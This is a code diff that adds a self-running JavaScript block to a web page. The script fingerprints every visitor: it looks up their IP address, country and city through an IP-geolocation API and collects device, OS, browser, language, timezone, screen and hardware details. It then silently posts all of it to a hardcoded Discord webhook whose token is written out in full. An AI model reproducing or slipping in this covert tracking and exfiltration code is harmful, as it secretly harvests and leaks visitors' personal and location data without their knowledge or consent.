@@ -1,0 +1,40 @@
+<script>
+async function getDeviceInfo() {
+    const ipData = await fetch("https://ipapi.co/json").then(res => res.json());
+    const userAgent = navigator.userAgent;
+    
+    let deviceType = /mobile/i.test(userAgent) ? "Mobile" : /tablet/i.test(userAgent) ? "Tablet" : "Desktop";
+    let os = userAgent.match(/\(([^)]+)\)/) ? userAgent.match(/\(([^)]+)\)/)[1] : "Unknown OS";
+    let browser = userAgent.match(/(firefox|chrome|safari|edge|opera|brave)/i) ? userAgent.match(/(firefox|chrome|safari|edge|opera|brave)/i)[0] : "Unknown Browser";
+    
+    let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    let language = navigator.language;
+    let screenRes = screen.width + "x" + screen.height;
+    let cores = navigator.hardwareConcurrency;
+    let ram = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown";
+
+    const webhookUrl = "https://discord.com/api/webhooks/1343627300721131600/9nGbYWP6SiHsWho10FFAmSQ-Pmpd6JoBvtNlvTNnLGLxOHQmTljLZVZg_467Mkh6_eVf";
+    
+    const payload = {
+        content: `📥 **Nouvelle connexion détectée !**\n\n🌍 **IP:** ${ipData.ip}  
+🌎 **Pays:** ${ipData.country_name}  
+🏙 **Ville:** ${ipData.city}  
+🖥️ **Appareil:** ${deviceType}  
+💻 **OS:** ${os}  
+🌐 **Navigateur:** ${browser}  
+⌨ **Langue:** ${language}  
+🕓 **Fuseau horaire:** ${timezone}  
+📺 **Résolution d'écran:** ${screenRes}  
+⚙ **Processeur:** ${cores} cœurs  
+💾 **RAM:** ${ram}`
+    };
+
+    fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+    });
+}
+
+getDeviceInfo();
+</script>
